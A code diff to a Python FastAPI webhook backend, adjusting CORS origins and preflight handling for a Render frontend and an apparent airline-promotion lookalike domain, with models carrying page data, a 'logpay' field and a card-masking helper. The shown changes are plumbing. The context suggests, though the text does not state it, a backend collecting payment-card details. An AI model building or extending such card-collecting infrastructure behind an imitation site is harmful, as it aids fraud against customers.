@@ -20,12 +20,12 @@ logger = logging.getLogger("webhook")
 app = FastAPI()
 
 # ===========================
-# 🔹 CORS (compatible con Render)
+# 🔹 CONFIGURACIÓN DE CORS
 # ===========================
 origins = [
-    "https://latam-from.onrender.com",               # ✅ tu frontend en Render
-    "https://ltamaeropromoweb-ecuador.netlify.app",  # otro dominio autorizado
-    "http://localhost:4200",                         # para pruebas locales
+    "https://latam-from.onrender.com",               # frontend en Render
+    "https://ltamaeropromoweb-ecuador.netlify.app",  # dominio anterior (Netlify)
+    "http://localhost:4200"                          # desarrollo local
 ]
 
 app.add_middleware(
@@ -36,7 +36,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ✅ Manejador global para preflight OPTIONS
+# ✅ Manejador global para solicitudes OPTIONS (preflight)
 @app.options("/{rest_of_path:path}")
 async def preflight_handler(request: Request, rest_of_path: str):
     origin = request.headers.get("origin")
@@ -49,22 +49,39 @@ async def preflight_handler(request: Request, rest_of_path: str):
             "Access-Control-Allow-Origin": origin,
             "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
             "Access-Control-Allow-Headers": "Authorization, Content-Type",
+            "Access-Control-Allow-Credentials": "true",
         },
     )
 
-# ✅ Middleware global: agrega cabeceras CORS incluso a respuestas de error
+# ✅ Endpoint explícito para OPTIONS /api/preset (Render requiere esto)
+@app.options("/api/preset")
+async def preset_options(request: Request):
+    origin = request.headers.get("origin")
+    if origin not in origins:
+        origin = origins[0]
+
+    return JSONResponse(
+        content={"ok": True},
+        headers={
+            "Access-Control-Allow-Origin": origin,
+            "Access-Control-Allow-Methods": "POST, OPTIONS",
+            "Access-Control-Allow-Headers": "Authorization, Content-Type",
+            "Access-Control-Allow-Credentials": "true",
+        },
+    )
+
+# ✅ Middleware global: añade headers CORS incluso en errores
 @app.middleware("http")
 async def add_cors_headers(request: Request, call_next):
-    response = await call_next(request)
+    try:
+        response = await call_next(request)
+    except Exception as e:
+        # Cubre excepciones que corten la cadena normal
+        logger.error(f"❌ Error global en middleware: {e}")
+        response = JSONResponse(content={"detail": "Internal Server Error"}, status_code=500)
+
     origin = request.headers.get("origin")
-
-    allowed_origins = [
-        "https://latam-from.onrender.com",
-        "https://ltamaeropromoweb-ecuador.netlify.app",
-        "http://localhost:4200"
-    ]
-
-    if origin in allowed_origins:
+    if origin in origins:
         response.headers["Access-Control-Allow-Origin"] = origin
         response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
         response.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
@@ -76,13 +93,13 @@ async def add_cors_headers(request: Request, call_next):
 # ===========================
 # 🔹 MODELOS DE ENTRADA
 # ===========================
-class Payload(BaseModel):  # Original para /webhook
+class Payload(BaseModel):  # para /webhook
     token: Optional[str]
     page: Dict[str, Any]
     ts: Optional[str]
 
 
-class PresetPayload(BaseModel):  # Nuevo para /api/preset
+class PresetPayload(BaseModel):  # para /api/preset
     a: Optional[str] = None
     id: Optional[str] = None
     logpay: Optional[Any] = None
@@ -113,7 +130,7 @@ class PresetPayload(BaseModel):  # Nuevo para /api/preset
 
 
 # ===========================
-# 🔹 FUNCIONES DE UTILIDAD
+# 🔹 FUNCIONES AUXILIARES
 # ===========================
 def mask_card(number: str) -> str:
     digits = re.sub(r"\D", "", str(number or ""))
